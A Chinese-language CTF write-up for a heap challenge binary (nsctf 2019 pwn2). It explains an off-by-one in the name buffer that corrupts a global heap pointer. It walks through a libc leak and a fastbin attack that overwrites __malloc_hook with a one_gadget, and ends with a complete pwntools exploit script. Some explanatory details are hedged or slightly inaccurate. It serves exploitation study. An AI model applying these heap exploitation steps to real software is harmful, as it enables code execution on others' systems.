# 执行环境
- 运行环境
  - Ubuntu 16.04
  - libc 2.23
- 缓解措施
  - ASLR: on
  - PIE: off
  - NX: on
  - RELRO: Partial RELRO
  - Canary: on

# 漏洞成因
## 程序关键结构体
程序使用全局变量管理一个单一的堆块（笔记），并未使用结构体数组。关键全局变量如下：
- `unk_202060 (0x202060)`: 用于存储用户名的缓冲区，大小为 0x30 字节。
- `qword_202090 (0x202090)`: 指向当前分配堆块（笔记内容）的指针。
- `unk_202040 (0x202040)`: 记录当前分配堆块的大小。

## 漏洞定位
漏洞位于 `sub_C60()` 函数（对应菜单选项4，`update your name`）中。该函数允许向 `unk_202060` 写入 `0x31` (49) 字节，但 `unk_202060` 的缓冲区大小实际只有 `0x30` (48) 字节。`qword_202090` 位于 `unk_202060` 之后 `0x30` 字节处，因此多写的 1 字节正好覆盖 `qword_202090` 的最低有效字节（Least Significant Byte），造成 **一字节溢出**。

```c
ssize_t sub_C60()
{
  puts("Please input your name");
  // 读入 0x31 字节到 &unk_202060，但 unk_202060 到 qword_202090 仅相隔 0x30 字节
  return read(0, &unk_202060, 0x31u); // [!] Off-by-one 溢出
}
```
利用这一字节溢出，可以部分覆写堆指针，使其指向其他可控的内存区域（如之前分配或释放的堆块内部），从而引发 **Use-After-Free (UAF)** 或 **堆重叠** 等问题，为信息泄露和后续利用创造条件。

# 漏洞利用过程：
利用的核心思路是通过一字节溢出修改全局堆指针，使其指向一个已释放的、包含 `main_arena` 地址的堆块，从而泄露 libc 基址。随后，通过精心的堆布局制造一个 `fastbin` 块，并利用相同的指针修改技巧，通过 `fastbin attack` 将 `__malloc_hook` 链入 `fastbin` 中，最终修改 `__malloc_hook` 为 `one_gadget` 以获取 shell。

- Step 1~3: 初始化用户名缓冲区，并分配两个堆块为后续布局做准备。通过一字节溢出将堆指针修改为指向第一个大堆块 (`chunk0`) 内部的某个位置。
- Step 4~6: 释放当前（被错误指向的）堆块，并通过重新分配和再次溢出，将堆指针调整至 `chunk0` 的 `fd` 指针位置，从而通过 `show` 功能泄露 `main_arena` 地址，计算得到 `libc` 基址。
- Step 7~10: 进行堆布局，制造一个处于 `fastbin` 状态的 `chunk`，并再次利用一字节溢出，将指向该 `fastbin chunk` 的堆指针修改为指向其 `fd` 指针所在位置。
- Step 11~13: 通过 `edit` 功能将 `fastbin chunk` 的 `fd` 指针覆写为 `__malloc_hook` 附近的伪造 `chunk` 地址。经过两次 `add` 分配出该伪造 `chunk`，最后通过 `edit` 向 `__malloc_hook` 写入 `one_gadget` 和调整栈的 `realloc` 地址。
- Step 14: 触发 `malloc` 调用 `__malloc_hook`，执行 `one_gadget` 获得 shell。

## Step 1~3
- **Step 1**: 程序开始时，调用 `sub_A00()` 要求输入用户名。此时向全局变量 `unk_202060 (0x202060)` 写入 `0x30` 个 `'a'`，恰好填满该缓冲区。
- **Step 2**: 
  - `add(size=0x80)`: 分配 `chunk0`，假设地址为 `0xef0250`。全局堆指针 `qword_202090 (0x202090)` 指向 `0xef0250`。
  - `add(size=0x10)`: 分配 `chunk1`，假设地址为 `0xef02e0`。全局堆指针被更新为指向 `0xef02e0`。`chunk0` 成为“悬浮”的堆块（未被释放但失去引用）。
- **Step 3**: `update(content=b'a'*0x30 + p8(0x10))`。`b'a'*0x30` 覆盖原用户名，`p8(0x10)` 溢出 1 字节，将堆指针 `qword_202090` 从 `0xef02e0` 的最低字节 `0xe0` 修改为 `0x10`，从而指向 `0xef0210`。此地址位于 `chunk0` 的 `prev_size` 或更前方的内存区域。

## Step 4~6
- **Step 4**: `delete()` 释放当前堆指针指向的 `0xef0210`。由于该地址可能不构成一个合法的堆块起始位置，其行为依赖于堆管理器的状态，但在此利用链中，它成功地释放了一个特定区域，为后续泄露创造了条件。
- **Step 5**: 
  - `add(size=0x10)`: 重新分配一个小堆块。此时 `fastbin` 或 `tcache` 可能被使用，改变了堆布局。
  - `update(content=b'a'*0x30 + p8(0x30))`: 再次溢出，将堆指针从 `0xef0210` 修改为 `0xef0230`。这个地址位于 `chunk0` 的 `fd/bk` 指针区域附近（当 `chunk0` 被放入 `unsorted bin` 后）。
- **Step 6**: `show()` 打印当前堆指针 (`0xef0230`) 指向的内容。由于 `chunk0` 已被释放并链入 `unsorted bin`，其 `fd` 和 `bk` 指针均指向 `main_arena` 内部的某个地址。通过接收数据并解析，泄露 `libc` 地址，进而计算出 `libc` 基址。

## Step 7~10
- **Step 7**: `add(size=0x60)` 分配一个 `0x70` 大小的堆块，从 `unsorted bin` 中切割，可能改变 `unsorted bin` 的链表状态。
- **Step 8**: 
  - `add(size=0x40)` 和 `add(size=0x60)` 分配两个新堆块。
  - `delete()` 释放最后分配的 `0x60` 大小堆块，使其进入 `fastbin`（大小为 `0x70`）。
- **Step 9**: `add(size=0x10)` 分配一个小堆块，可能用于隔离或调整堆状态。
- **Step 10**: `update(content=b'a'*0x30 + p8(0x10))` 再次溢出，将堆指针修改为指向 `Step 8` 中释放的 `fastbin chunk` 的 `fd` 指针位置（即 `main_arena` 的 `fastbin` 数组地址）。此时，我们可以通过 `edit` 修改这个 `fd` 指针。

## Step 11~13
- **Step 11**: `edit(content=p64(libc.sym['__malloc_hook'] - 0x23))`。由于当前堆指针指向 `fastbin chunk` 的 `fd` 位置，此操作将该 `fd` 修改为 `__malloc_hook` 之前 `0x23` 字节的地址（一个伪造的、能满足 `fastbin` 大小检查的 `chunk` 地址）。
- **Step 12**: 连续两次 `add(size=0x60)`。第一次分配出原来的 `fastbin chunk`，第二次将从被篡改的 `fd` 链中分配出位于 `__malloc_hook` 附近的伪造 `chunk`。此时，全局堆指针指向这个伪造的 `chunk`。
- **Step 13**: `edit(content=b'a'*(0x13 - 0x8) + p64(libc.address + one_gadget) + p64(libc.sym['realloc'] + 12))`。向伪造的 `chunk` 写入数据。计算偏移使得 `one_gadget` 被精确写入 `__malloc_hook` 的位置，并在其后写入 `realloc+12` 以调整栈帧，提高 `one_gadget` 触发成功率。

## Step 14
- **Step 14**: `add(size=0x50)` 触发一次 `malloc` 调用。由于 `__malloc_hook` 已被覆写，程序流跳转到 `one_gadget`，从而获得 shell。

# Exploit：
```python
from pwn import *
from pwncli import one_gadget

context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']
p = process('./data/bin/heap23_15_nsctf_online_2019_pwn2')
elf = ELF('./data/bin/heap23_15_nsctf_online_2019_pwn2')
libc = elf.libc
choice_words = '6.exit\n'
menu_add = 1
add_index_words = ''
add_size_words = 'Input the size\n'
add_content_words = ''
menu_del = 2
del_index_words = ''
menu_show = 3
show_index_words = ''
menu_edit = 5
edit_index_words = ''
edit_size_words = ''
edit_content_words = 'Input the note\n'
one_gadget = 0x4527a

def add(index=-1, size=-1, content=''):
    p.sendlineafter(choice_words, str(menu_add))
    if add_size_words:
        p.sendlineafter(add_size_words, str(size))
    # 该程序add时无content输入，content参数在此函数中未使用

def delete(index=-1):
    p.sendlineafter(choice_words, str(menu_del))

def show(index=-1):
    p.sendlineafter(choice_words, str(menu_show))

def edit(index=-1, size=-1, content=''):
    p.sendlineafter(choice_words, str(menu_edit))
    if edit_content_words:
        p.sendafter(edit_content_words, content)

def update(content):
    p.sendlineafter(choice_words, '4')
    p.sendafter('input your name\n', content)  # 触发漏洞的函数

# Step 1: 填充name缓冲区，为后续溢出做准备
p.recv()
payload = b'a'*0x30
p.send(payload)

# Step 2: 分配两个堆块，chunk0 (0x80) 和 chunk1 (0x10)
add(size=0x80)
add(size=0x10)

# Step 3: 利用update的off-by-one，将堆指针从chunk1改为指向chunk0内部的某个位置
update(content=b'a'*0x30 + p8(0x10))

# Step 4: 删除当前（被错误指向的）堆块
delete()

# Step 5: 重新分配一个小堆块，并再次溢出，调整堆指针位置以指向libc地址所在处
add(size=0x10)
update(content=b'a'*0x30 + p8(0x30))

# Step 6: 展示堆内容，泄露libc地址
show()
libc_leak = u64(p.recv(6).ljust(8, b'\x00'))
# 计算libc基址，偏移需根据实际调试确定（这里偏移对应main_arena+88）
libc.address = libc_leak - (0x3c4b20 + 0x58)

# Step 7: 分配一个0x60的堆块，可能用于改变堆布局
add(size=0x60)

# Step 8: 分配两个堆块，并释放第二个，使其进入fastbin
add(size=0x40)
add(size=0x60)
delete()

# Step 9: 分配一个小堆块
add(size=0x10)

# Step 10: 再次溢出，将堆指针指向fastbin chunk的fd位置
update(content=b'a'*0x30 + p8(0x10))

# Step 11: 编辑fastbin chunk的fd，将其指向__malloc_hook附近的伪造chunk
edit(content=p64(libc.sym['__malloc_hook'] - 0x23))

# Step 12: 两次分配，第二次将分配出__malloc_hook附近的伪造chunk
add(size=0x60)
add(size=0x60)

# Step 13: 向伪造chunk写入one_gadget和realloc+12到__malloc_hook
# 0x13 是伪造chunk的data区到__malloc_hook的偏移，0x8是prev_size? 这里应仔细计算
edit(content=b'a'*(0x13 - 0x8) + p64(libc.address + one_gadget) + p64(libc.sym['realloc'] + 12))

# Step 14: 触发malloc，调用被覆写的__malloc_hook，getshell
add(size=0x50)

p.interactive()
```